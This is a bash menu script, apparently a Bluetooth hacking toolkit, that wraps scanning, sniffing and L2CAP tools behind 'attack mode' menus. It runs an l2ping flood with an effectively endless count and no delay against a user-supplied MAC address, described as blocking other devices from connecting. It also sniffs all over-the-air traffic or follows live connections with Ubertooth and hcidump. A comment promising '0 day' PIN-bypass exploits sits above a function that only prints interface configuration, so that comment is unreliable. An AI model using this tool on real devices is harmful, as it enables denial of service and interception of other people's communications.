 #!/bin/bash

 ####Colors####
 
green="\033[32;1m"
yellow="\033[33;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
red="\033[31;1m"
blue="\033[34;1m"
chill="sleep 1.5"

####Banner####

Banner(){
echo ${blue}
clear
echo 
echo
echo  ''' 


▀█████████▄   ▄█       ███    █▄     ▄████████    ▄█    █▄       ▄████████  ▄████████    ▄█   ▄█▄ 
  ███    ███ ███       ███    ███   ███    ███   ███    ███     ███    ███ ███    ███   ███ ▄███▀ 
  ███    ███ ███       ███    ███   ███    █▀    ███    ███     ███    ███ ███    █▀    ███▐██▀   
 ▄███▄▄▄██▀  ███       ███    ███  ▄███▄▄▄      ▄███▄▄▄▄███▄▄   ███    ███ ███         ▄█████▀    
▀▀███▀▀▀██▄  ███       ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀███▀  ▀███████████ ███        ▀▀█████▄    
  ███    ██▄ ███       ███    ███   ███    █▄    ███    ███     ███    ███ ███    █▄    ███▐██▄   
  ███    ███ ███▌    ▄ ███    ███   ███    ███   ███    ███     ███    ███ ███    ███   ███ ▀███▄ 
▄█████████▀  █████▄▄██ ████████▀    ██████████   ███    █▀      ███    █▀  ████████▀    ███   ▀█▀ 
             ▀                                                                          ▀         
'''
}                                                       


 ####Variables####

  
  Tool=xterm
  smacker=l2ping
  scanner=hcitool
  scanner2=bluetoothctl
  sniffer=hcidump
  Track=info
  uber=ubertooth
  
 ####Menu option####


        Menuoption() {
        Banner
         echo
          echo
           echo    $purple"{"$cyan"1"$purple"}"$yellow"--"$green"BlueHexCoder (to write values for BLE devices on GATT server and write commands for BC)" 
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"BlueHexDecoder (to decode Values for BLE devices on GATT server and decode HEX commands or packets )"
              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"L2CAPping (PINGs method L2CAP test connect for BLE I BC)"
              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"BlueScan (Personalized Bluetooth scanners for BLE and BC/BR)" 
               echo    $purple"{"$cyan"5"$purple"}"$yellow"--"$green"BlueSniff (Sniff comunications using Ubertooth or hci controller)" 
                echo    $purple"{"$cyan"6"$purple"}"$yellow"--"$green"BlueConf (Check youre HCI interface config info) "
                echo    $purple"{"$cyan"7"$purple"}"$yellow"--"$green"BlueSDPdiscover (A SDP dumper just for BC/BR devices)" 
                echo    $purple"{"$cyan"8"$purple"}"$yellow"--"$green"BlueExit (Exit of program)"
                echo    $purple"{"$cyan"9"$purple"}"$yellow"--"$green"Go to Page 2"
                 echo
                            echo $purple "╭─"$green"Select Attack mode (.__.) "$purple
                           read -p " ╰─$ " get
  
                                if [ $get -eq 1 ];
                                        then
                                            BlueHexCoder

                                                elif [ $get -eq 2 ];
                                                then
                                                        BlueHexDecoder

                                                elif [ $get -eq 3 ];
                                                        then
                                                                L2CAPpingBLE_BC

                                                                        elif [ $get -eq 4 ];
                                                                                then

                                                                        BlueScan

                                                                                elif [ $get -eq 5 ];
                                                                                        then

                                                                                        BlueSniff
                                                                                        
                                                                                        elif [ $get -eq 6 ];
                                                                                        then

                                                                                        BlueConf

                                                                                elif [ $get -eq 7 ];
                                                                                then
                                                                                BlueSDPdiscover

                                                                                
                                                                                elif [ $get -eq 8 ];
                                                                                then
                                                                                echo ${red}                                  
                                                                        echo "BYEEE >:)"  
                                                                        exit
                                                          

                                                                                        


                                                                  elif [ $get -eq 9 ];
                                                              then
                                                                    sh BLUEHACK2.sh
                                                                        
                                                                        else
                                                                        echo ""
                                                                        echo "NONONONO WRONG OPTION  :("
                                                                        sleep 1.2
                                                                        Menuoption
                                                                        fi
                                                                                }





#### A HEX manually coder for BLE characteristics write Inputs or HEX AT Commands for BC/BR. ####

BlueHexCoder(){

python3 scripts/coders/converter.py


}

#### A HEX manually decoder for BLE characteristics DUMPS or HEX AT Commands for BC/BR. ####


BlueHexDecoder(){

python3 scripts/coders/decoder.py


}

#### For free peripherical devices on BC/BR that wait connections you can connect and block L2CAP connections for rest of other devices that try connect to peripherical device. ####


#### At the same time its a L2CAP test ping for BC/BR devices to check if you can connect and communicate with the device, generally L2CAP connections for BLE devices are open.  
#### So maybe you can extract UUIDS of GATT char and other info to BLE device. ####

L2CAPpingBLE_BC(){
echo ""
echo    $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Ping loop BC/BR device"
echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Ping loop BLE device"
echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Back menu"
echo ""
echo $purple "╭─"$green"Select l2cap ping option (-_-) "$purple
                           read -p " ╰─$ " l2cap


                                        if [ $l2cap -eq 1 ];
                                        then

echo "" & python3 scripts/scanners/BC.py &&
echo $purple "╭─"$green"Enter MAC address target (-_-) "$purple
                           read -p " ╰─$ " get
echo ""

$Tool -fg red -e $smacker $get -f 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999 -s 640 -d 0 -t 0


                                        elif [ $l2cap -eq 2 ];
                                                then
                                                 
                                        python3 scripts/L2CAP/l2capBLEtest.py

                                        elif [ $l2cap -eq 3 ];
                                                then
sudo sh BLUEHACK.sh


else

echo "incorrect option :'("
sleep 2
clear
L2CAPpingBLE_BC

fi
}

#### Python3 scripts to scan BLE or BC/BR bluetooth devices by other way includes a Ubertooth scanner command to discover devices ####

BlueScan(){
echo
        echo    $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Ubertooth scan + extra info of devices"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Python BLE scan"
             echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Python BC scan"
              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Back to menu "
              echo    $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Exit"
           
echo
                            echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " get
  
                                if [ $get -eq 1 ];
                                        then

                                        $uber-scan -s -x

                                        elif [ $get -eq 2 ];
                                                then
                                                 
                                        python3 scripts/scanners/BLE.py

                                        elif [ $get -eq 3 ];
                                                then
                                                 
                                         python3 scripts/scanners/BC.py
                                        
       

                                                elif [ $get -eq 4 ];
                                                        then
                                                        Menuoption

                                                        elif [ $get -eq 5 ];
                                                        then
                                                        exit
                                                            fi    

}


#### This Menu its for sniff traffic by 5 ways if you sniff without pairing or connecting a device youre gonna sniff all traffic on air. ####
#### But if you Hacked a device or a existent device pairing you just gonna sniff that communicaction. ####

BlueSniff(){

echo
echo  $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Ubertooth sniff (sniff all LAPs)"
echo  $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Ubertooth sniff (Discovers all LAPs+UAPs)"
echo  $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Ubertooth sniff (Follow active conections)"
echo  $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Ubertooth sniff (Follow all conections)"
echo  $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Hcidump sniff (from hci0 controller in hex brute format and ascii)"
echo  $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Back to menu "
echo  $purple"{"$cyan"7"$purple"}"$yellow"--"$green"Exit"
echo

                            echo $purple "╭─"$green"Select Attack mode  "$purple
                           read -p " ╰─$ " get
  
                                if [ $get -eq 1 ];
                                        then
                                                        $uber-rx --

                                        elif [ $get -eq 2 ];
                                                then
                                                        $uber-rx -z 
        

                                                elif [ $get -eq 3 ];
                                                        then
                                                        $uber-btle -p 
                                                      

                                                        elif [ $get -eq 4 ];
                                                        then
                                                        $uber-btle -f                                                        
                                                      

                                                        elif [ $get -eq 5 ];
                                                        then
                                
                                echo $purple "╭─"$green"Put name of youre bluetooth interface:  "$purple 
                                read -p " ╰─$ " interface

        $Tool -fg yellow -e $sniffer -i $interface --raw & $Tool -fg orange -e $sniffer -i $interface & $Tool -fg green -e btmon -i $interface 


                                                        elif [ $get -eq 6 ];
                                                        then
                                                        
                                                      Menuoption

                                                        elif [ $get -eq 7 ];
                                                        then

                                                        exit

                                                            fi    
}

#### Here you have automated/personalized 0 day exploits to get pairing and connection on a device bypassing PIN validation security. ####


BlueConf(){

echo ${red}                                  
                                                         echo $purple "╭─"$green"Put youre hci name interface (-_-) "$purple
                                                        read -p " ╰─$ " HCIcheck




echo ""
sleep 1
echo ""
echo "----------------------------------------------------------------------------" 
echo $red "Showing Basic info" $yellow
echo "----------------------------------------------------------------------------" 
sleep 1
sudo hciconfig -a $HCIcheck 
sleep 1
echo ""
echo "----------------------------------------------------------------------------" 
echo $red "Showing HCI interface supported comands" $yellow
echo "----------------------------------------------------------------------------" 
sleep 1
sudo hciconfig -a $HCIcheck commands
sleep 1                                                        
echo ""
echo "----------------------------------------------------------------------------" 
echo $red "Showing HCI LE STATES info" $yellow
echo "----------------------------------------------------------------------------" 
sleep 1
sudo hciconfig -a $HCIcheck lestates
echo ""


}

#### Python3 script to discover services from a bluetooth BC/BR device. ####

BlueSDPdiscover(){
echo
echo "starting BC sdp service discover..."
python3 scripts/scanners/sdpdiscover.py

}

#### Just a caller ####

FuncioRecon(){
Banner    
Menuoption
}     
FuncioRecon                                                  
